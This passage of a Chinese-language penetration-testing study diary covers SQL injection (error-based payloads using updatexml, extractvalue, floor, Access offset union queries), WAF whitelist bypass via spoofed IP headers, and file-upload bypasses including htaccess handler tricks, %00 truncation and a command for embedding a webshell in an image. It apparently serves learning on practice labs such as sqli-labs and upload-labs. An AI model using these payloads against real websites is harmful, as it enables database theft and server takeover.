+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">MYSQL注入</span><br><span class="line"></span><br><span class="line"># 高权限注入</span><br><span class="line"></span><br><span class="line"># 文件读写操作</span><br><span class="line">load_file()				读取函数</span><br><span class="line">into outfile 或into dumpfile			导出函数</span><br><span class="line"></span><br><span class="line"># 路径获取常见方法</span><br><span class="line">报错显示、遗留文件、漏洞报错、平台配置文件、爆破、等</span><br><span class="line"></span><br><span class="line"># 常见读取文件列表</span><br><span class="line"></span><br><span class="line"># 常见写入文件问题：魔术引号开关</span><br><span class="line">存在魔术引号：编码、宽字节绕过</span><br><span class="line"></span><br><span class="line"># 低版本注入配合读取或暴力</span><br><span class="line">字典或读取</span><br></pre></td></tr></table></figure>
+
+<h2 id="第十四天"><a href="#第十四天" class="headerlink" title="第十四天"></a>第十四天</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">SQL中的干扰语句：&#x27;,&quot;,%,(,),&#125;</span><br><span class="line"></span><br><span class="line"># 简要明确参数类型</span><br><span class="line">数字，字符，搜索，Json等</span><br><span class="line"></span><br><span class="line"># 简要明确请求方法</span><br><span class="line">GET，POST，cookie，request，HTTP</span><br><span class="line"></span><br><span class="line"># 注释方法 --+、#</span><br><span class="line">--+ 是url编码后的-- (空格)</span><br><span class="line">url编码将空格转化为+</span><br><span class="line"></span><br><span class="line"># sqllibs-less11：</span><br><span class="line">POST注入</span><br><span class="line">不能用--+，要用#，应为POST内容没有经过url编码</span><br><span class="line"></span><br><span class="line"># sqllibs-less20</span><br><span class="line">限制POST注入长度</span><br><span class="line">cookie注入可以绕过POST</span><br><span class="line"></span><br><span class="line"># sqllibs-less18</span><br><span class="line">JSON格式</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="第十五天"><a href="#第十五天" class="headerlink" title="第十五天"></a>第十五天</h2><p>oracle，MongoDB注入</p>
+<p><img src="/2021/10/01/xiaodi1/image-20210911094537072-16313247437281.png" alt="image-20210911094537072"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># JSON注入</span><br><span class="line"></span><br><span class="line">数字类型不需要闭合</span><br><span class="line">自负类型需要闭合 </span><br><span class="line"></span><br><span class="line"># 简要学习各种注入工具的使用指南</span><br><span class="line"></span><br><span class="line">数据库架构组成，数据库高权限操作</span><br><span class="line"></span><br><span class="line"># 注入工具</span><br><span class="line"></span><br><span class="line">sqlmap、nosqlattack、pangolin</span><br><span class="line"></span><br><span class="line"># 网站注入点用户权限由连接数据库的用户决定，</span><br><span class="line"></span><br><span class="line">写在网站服务器sql的配置文件中</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="第十六天"><a href="#第十六天" class="headerlink" title="第十六天"></a>第十六天</h2><p>查询方式及报错盲注</p>
+<p>当进行sql注入时，是很多注入会出现无回显的情况，其中不回显的原因可能是sql语句查询方式的问题导致，这个时候我们需要用到相关的报错或盲注进行后续操作。同时作为手工注入时，提前了解或预知其他sql语句大概写法也能更好地选择对应的注入语句。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># 补充：Access暴力猜想不出问题</span><br><span class="line">Access偏移注入：解决列名获取不到情况</span><br><span class="line">查看登录框原代码的表单或观察URL特征等也可以针对表或列获取不到情况</span><br><span class="line"></span><br><span class="line">偏移语句</span><br><span class="line">1.猜字段数</span><br><span class="line"></span><br><span class="line">http://www.xxx.com/show.asp?id=123 order by 20 页面返回正确</span><br><span class="line">http://www.xxx.com/show.asp?id=123 order by 21 页面返回错误</span><br><span class="line"></span><br><span class="line">2.猜表名：</span><br><span class="line"></span><br><span class="line">http://www.xxx.com/show.asp?id=123 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from admin</span><br><span class="line">返回正确，说明存在admin表，但是紧接着，爆出的数字地方，放入常用的字段始终报错，并不能猜出正确的字段，进而：</span><br><span class="line"></span><br><span class="line">3.猜表下的字段数：</span><br><span class="line"></span><br><span class="line">为了让语句正确，用*来加长字段数：</span><br><span class="line"></span><br><span class="line">http://www.xxx.com/show.asp?id=123 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19，* from admin（页面报错）</span><br><span class="line">… …</span><br><span class="line">http://www.xxx.com/show.asp?id=123 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from admin（页面正确）</span><br><span class="line"></span><br><span class="line">此时就发现了admin表下有四个字段（20-16=4）。</span><br><span class="line"></span><br><span class="line">4.inner join 连接查询：</span><br><span class="line"></span><br><span class="line">inner join查询是将一张表虚拟成多张相同的表来进行查询（我自己是这么理解的。）</span><br><span class="line">首先用两张表来进行查询，应该减去重复的部分也就是这四个字段，不能让这四个字段算两次，这样的话20-4-4=12，语句中只需要罗列出12个数字。</span><br><span class="line"></span><br><span class="line">http://www.xxx.com/show.asp?id=123 union select 1,2,3,4,5,6,7,8,9,10,11,12,* from (admin as a inner join admin as b on?a.id = b.id)</span><br><span class="line">http://www.xxx.com/show.asp?id=123 union select 1,2,3,4,5,6,7,8,9,10,11,12,a.id,b.id,* from (admin as a inner join?admin as b on a.id = b.id)</span><br><span class="line"></span><br><span class="line">上面的这两种情况还是报错，那么我们继续再来添加一张表，再减去重复的四个字段，20-4-4-4=8，语句中只需要罗列出8个数字,再次使用inner join查询：</span><br><span class="line">http://www.xxx.com/show.asp?id=123 union select 1,2,3,4,5,6,7,8,a.id,b.id,c.id,* from ((admin as a inner join admin as?b on a.id=b.id) inner join admin as c on a.id=c.id)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select</span><br><span class="line">insert</span><br><span class="line">delete</span><br><span class="line">update</span><br><span class="line">order by</span><br><span class="line"></span><br><span class="line"># 重点理解</span><br><span class="line">我们可以通过查询方式与网站应用的关系</span><br><span class="line">注入点产生地方或应用猜测到对方的SQL查询方式</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SQL注入报错盲注</span><br><span class="line">盲注就是在注入过程中，获取的数据不能回显到前端页面。此时，我们需要利用一些当打进行判断或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类：</span><br><span class="line">基于布尔的sql盲注-逻辑判断（第二优先）</span><br><span class="line">regexp、like、ascii、left、ord、mid</span><br><span class="line"></span><br><span class="line">基于时间的sql盲注-延时判断（第三优先，效率最慢）</span><br><span class="line">if、sleep</span><br><span class="line">不推荐，受网络和服务器响应的影响</span><br><span class="line"></span><br><span class="line">基于报错的sql盲注-报错回显（最优先，效率最快）</span><br><span class="line">floor、updatexml、extractvalue</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">mysql报错注入payload</span><br><span class="line"></span><br><span class="line">1.floor()</span><br><span class="line"></span><br><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line"></span><br><span class="line">2.extractvalue()</span><br><span class="line"></span><br><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line"></span><br><span class="line">3.updatexml()</span><br><span class="line"></span><br><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br><span class="line"></span><br><span class="line">4.geometrycollection()</span><br><span class="line"></span><br><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">5.multipoint()</span><br><span class="line"></span><br><span class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">6.polygon()</span><br><span class="line"></span><br><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">7.multipolygon()</span><br><span class="line"></span><br><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">8.linestring()</span><br><span class="line"></span><br><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">9.multilinestring()</span><br><span class="line"></span><br><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">10.exp()</span><br><span class="line"></span><br><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">判断database：首先判断长度</span><br><span class="line"></span><br><span class="line">参考</span><br><span class="line">like</span><br><span class="line">regexp</span><br><span class="line">if</span><br><span class="line">sleep</span><br><span class="line">mid</span><br><span class="line">substr</span><br><span class="line">left</span><br><span class="line">length</span><br><span class="line">ord</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># MySQL注入天书</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="第十七天"><a href="#第十七天" class="headerlink" title="第十七天"></a>第十七天</h2><p>二次，加解密，dns等注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 加解密</span><br><span class="line">sqllabs-less21</span><br><span class="line">当发送的注入点数据是加密的时候，需要先解密将明文连接payload再加密</span><br><span class="line"></span><br><span class="line"># 二次</span><br><span class="line">前端和黑盒看不到，只有从源代码看到</span><br><span class="line">sqlilabs-less24</span><br><span class="line">类似定时炸弹，将payload合法提交写入数据库，等待再次使用来触发</span><br><span class="line">长度限制，分为前端和后端</span><br><span class="line">前端可以绕过，修改前端代码</span><br><span class="line">后端无法绕过</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/01/xiaodi1/image-20210914150820973.png" alt="image-20210914150820973"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># DNSlog注入</span><br><span class="line">需要高权限</span><br><span class="line">文件读取操作</span><br><span class="line">工具dnslogSql</span><br><span class="line">注入sql，让数据库访问dns</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="第十八天"><a href="#第十八天" class="headerlink" title="第十八天"></a>第十八天</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 堆叠注入</span><br><span class="line">select * from database1;select * from database2;</span><br><span class="line">只在部分数据库起作用</span><br><span class="line">例如：注入需要管理员账号密码，密码加密，无法解密。</span><br><span class="line">堆叠注入进行插入数据，用户密码自定义的，可以正常解密登录。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/01/xiaodi1/image-20210915091354495.png" alt="image-20210915091354495"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">反序列化有情况要求</span><br><span class="line">不同数据库特殊符号和注释符号不同</span><br><span class="line"></span><br><span class="line">mysql在数据中插入/**/不影响命令运行</span><br><span class="line">%0A是十六进制的换行</span><br><span class="line">%23    #</span><br><span class="line"></span><br><span class="line"># 参数污染</span><br><span class="line">传递两个相同参数</span><br><span class="line">根据服务器配置的中间件，读取第一个参数或最后一个参数</span><br><span class="line">y=1&amp;y=2</span><br><span class="line">/** payload #*/属于mysql注释符</span><br><span class="line">/*! payload */;内联注释</span><br><span class="line">可正常运行</span><br><span class="line"></span><br><span class="line">FUZZ-暴力测试</span><br></pre></td></tr></table></figure>
+
+<h2 id="第十九天"><a href="#第十九天" class="headerlink" title="第十九天"></a>第十九天</h2><p>WAF绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">其他绕过方法</span><br><span class="line"># 白名单</span><br><span class="line">伪造白名单方法</span><br><span class="line"></span><br><span class="line">方法一：IP白名单</span><br><span class="line">x-forwarded-for</span><br><span class="line">x-remote-IP</span><br><span class="line">x-originating-IP</span><br><span class="line">x-remote-addr</span><br><span class="line">x-Real-ip</span><br><span class="line"></span><br><span class="line">方法二：静态资源</span><br><span class="line">在网址末尾加上x.txt等静态文件，静态文件不会接收参数，参数还是传递给脚本文件执行</span><br><span class="line"></span><br><span class="line">方法三：url白名单</span><br><span class="line">为防止误拦，部分waf内置默认的白名单列表，只要url中存在白名单的字符串，就作为白名单不进行检测。</span><br><span class="line"></span><br><span class="line">方法四：爬虫白名单</span><br><span class="line">部分waf有提供爬虫白名单的功能，识别爬虫的技术一般有两种：</span><br><span class="line">1.根据userAgent</span><br><span class="line">2.通过行为判断</span><br><span class="line"></span><br><span class="line">WAF流量防御</span><br><span class="line">爬虫白名单</span><br><span class="line">代理池</span><br></pre></td></tr></table></figure>
+
+<h2 id="第二十天"><a href="#第二十天" class="headerlink" title="第二十天"></a>第二十天</h2><p><img src="/2021/10/01/xiaodi1/image-20210916085637100.png" alt="image-20210916085637100"></p>
+<p><img src="/2021/10/01/xiaodi1/image-20210916090202933.png" alt="image-20210916090202933"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">文件上传漏洞是高危漏洞，可以直接上传后门软件获取权限</span><br><span class="line"></span><br><span class="line">文件上传漏洞如何查找及判断</span><br><span class="line">黑盒查找</span><br><span class="line">后台拿 webshell</span><br><span class="line">文件后台、会员中心、文件扫描</span><br><span class="line">白盒查找</span><br><span class="line"></span><br><span class="line">文件上传漏洞注意</span><br><span class="line">编辑器、第三方、会员后台</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 解析漏洞</span><br><span class="line">photo.png/1.php</span><br><span class="line">将png格式图片解析成php，成功执行php代码</span><br><span class="line"></span><br><span class="line">靶场：uploadlabs</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="第二十一天"><a href="#第二十一天" class="headerlink" title="第二十一天"></a>第二十一天</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">文件上传常见验证：</span><br><span class="line">后缀名、类型、文件头</span><br><span class="line"></span><br><span class="line"># 后缀名</span><br><span class="line">黑名单</span><br><span class="line">asp php jsp aspx cgi war</span><br><span class="line">白名单</span><br><span class="line">jpg png zip rar gif</span><br><span class="line"></span><br><span class="line"># 类型</span><br><span class="line">在数据包中有一项为数据类型：</span><br><span class="line">Content-Type: image/gif</span><br><span class="line"></span><br><span class="line"># 文件头</span><br><span class="line">检测文件内容</span><br><span class="line">伪装文件头为合法文件</span><br><span class="line"></span><br><span class="line"># htaccess解析</span><br><span class="line">htaccess：</span><br><span class="line">&lt;FilesMatch &quot;conf&quot;&gt; </span><br><span class="line">SetHandler application/x-httpd-php </span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">这样config.txt这个文件就会解析为php</span><br><span class="line"></span><br><span class="line"># 缺少收尾去空</span><br><span class="line">可在数据包中的filename在末尾添加空格（ ）实现绕过</span><br><span class="line">服务器保存时会强制删去空格还原为php</span><br><span class="line"></span><br><span class="line"># 缺少删除文件最后的.</span><br><span class="line">可在数据包中的filename在末尾添加.实现绕过</span><br><span class="line">服务器保存时会强制删去空格还原为php</span><br><span class="line"></span><br><span class="line"># ::$$DATA绕过( windows系统)</span><br><span class="line">windows系统中::$$DATA之后的数据将被当作文件流处理，文件会保存::$$DATA之前的文件名</span><br><span class="line"></span><br><span class="line"># 一次过滤和循环过滤</span><br><span class="line">一次过滤可以添加添加多个.或空格实现绕过</span><br><span class="line"></span><br><span class="line"># %00截断</span><br><span class="line">文件保存地址将%00之后的文件路径截断</span><br><span class="line">1.php%00photh.jpg保存为1.php</span><br><span class="line">get自动解码</span><br><span class="line">post不解码</span><br><span class="line"></span><br><span class="line"># 0x00截断</span><br><span class="line">文件</span><br></pre></td></tr></table></figure>
+
+<h2 id="第二十二天"><a href="#第二十二天" class="headerlink" title="第二十二天"></a>第二十二天</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">图片一句话制作方法：</span><br><span class="line">copy 1.png /b + shell.php /a webshell.jpg</span><br><span class="line"></span><br><span class="line">文件头检测</span><br><span class="line">图像文件信息判断</span><br><span class="line">逻辑安全-二次渲染</span><br><span class="line">逻辑安全-条件竞争</span><br><span class="line">目录命名-x.php/.</span><br><span class="line">脚本函数漏洞-CVE-2015-2348</span><br><span class="line">数组接受+目录命名</span><br><span class="line"></span><br><span class="line"># php</span><br><span class="line">getimagesize()获取图片的信息，如果不是图片则会报错，代码无法往下执行</span><br><span class="line">exif_imagetype() 获取图片类型</span><br><span class="line">imagecreatefrompng()</span><br><span class="line">imagecreatefromgif()</span><br><span class="line"></span><br><span class="line"># 二次渲染</span><br><span class="line">服务器接受文件后，再将文件重命名或删除</span><br><span class="line">二次渲染不一定有漏洞</span><br><span class="line">在二次渲染之前进行文件验证就没有漏洞</span><br><span class="line">在二次渲染时进行文件验证就可能有漏洞</span><br><span class="line">属于逻辑漏洞</span><br><span class="line">可以通过占用文件来绕过漏洞</span><br><span class="line"></span><br><span class="line"># 目录命名</span><br><span class="line">将upload.jpg改为upload.php/.jpg</span><br><span class="line"></span><br><span class="line"># 数组接受+目录命名</span><br><span class="line">burp中save_name=&quot;upload.jpg&quot;</span><br><span class="line">对其设置为数组，即：</span><br><span class="line">save_name[0]=&quot;x.php&quot;</span><br><span class="line">save_name[2]=&quot;jpg&quot;</span><br><span class="line">当文件检测时，$file=&#123;&quot;x.php&quot;,&quot;&quot;,&quot;jpg&quot;&#125;</span><br><span class="line">最后一个为jpg，可以绕过白名单</span><br><span class="line">使用目录命名时：save_name=&quot;x.php/&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="第二十三天"><a href="#第二十三天" class="headerlink" title="第二十三天"></a>第二十三天</h2><p><img src="/2021/10/01/xiaodi1/image-20210920153434040.png" alt="image-20210920153434040"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 解析漏洞</span><br><span class="line">apache低版本解析漏洞</span><br><span class="line">例如：</span><br><span class="line">phpinfo.php.xxx</span><br><span class="line">首先识别xxx，发现无法识别，随后向前识别php。</span><br><span class="line"></span><br><span class="line">IIS7.5/nigix低版本解析漏洞</span><br><span class="line">upload.jpg/.php</span><br><span class="line"></span><br><span class="line">nigix文件名漏洞</span><br><span class="line">在upload.gif 在文件名后添加空格</span><br><span class="line">上传成功后，访问upload.gif .php</span><br><span class="line">访问的时候将空格的16进制数据改为20 00</span><br><span class="line"></span><br><span class="line"># 编辑器漏洞</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="第二十四天"><a href="#第二十四天" class="headerlink" title="第二十四天"></a>第二十四天</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"># 上传参数分析</span><br><span class="line">Content-Disposition：一般不可更改</span><br><span class="line">name：表单参数值，不可更改</span><br><span class="line">filename：可更改</span><br><span class="line">Content-Type：文件MINE，视情况更改</span><br><span class="line"></span><br><span class="line"># 常见绕过方法</span><br><span class="line">数据溢出-防匹配（xxx...）</span><br><span class="line">在正常参数之前添加大量数据，实现数据溢出</span><br><span class="line">注需要加;防止影响正常参数传递</span><br><span class="line"></span><br><span class="line">符号变异-防匹配（&#x27;&quot;;/）</span><br><span class="line">安全狗可以用&quot;x.php实现绕过</span><br><span class="line">x.php&quot;不行</span><br><span class="line">冒号不闭合，使服务器找不到对应的参数</span><br><span class="line">将其他数据写入filename，字符串闭合后，再写入x.php注入成功</span><br><span class="line">即安全狗识别前面的字符串，最后x.php赋值给filename</span><br><span class="line"></span><br><span class="line">数据截断-防匹配（%00 换行 ;）</span><br><span class="line">分块传输</span><br><span class="line"></span><br><span class="line">重复数据-防匹配（参数多次）</span><br><span class="line">递归循环</span><br><span class="line"></span><br><span class="line"># fuzz 模糊测试</span><br><span class="line"></span><br><span class="line"># 文件上传修复方案</span><br><span class="line">后端验证：采用服务端验证模式</span><br><span class="line">后缀验证：基于白名单，黑名单</span><br><span class="line">MIME验证：基于上传自带类型检测</span><br><span class="line">内容检测：文件头，完整性检测</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="第二十五天"><a href="#第二十五天" class="headerlink" title="第二十五天"></a>第二十五天</h2><p>xss跨站</p>
+<p><img src="/2021/10/01/xiaodi1/image-20211025142723291.png" alt="image-20211025142723291"></p>
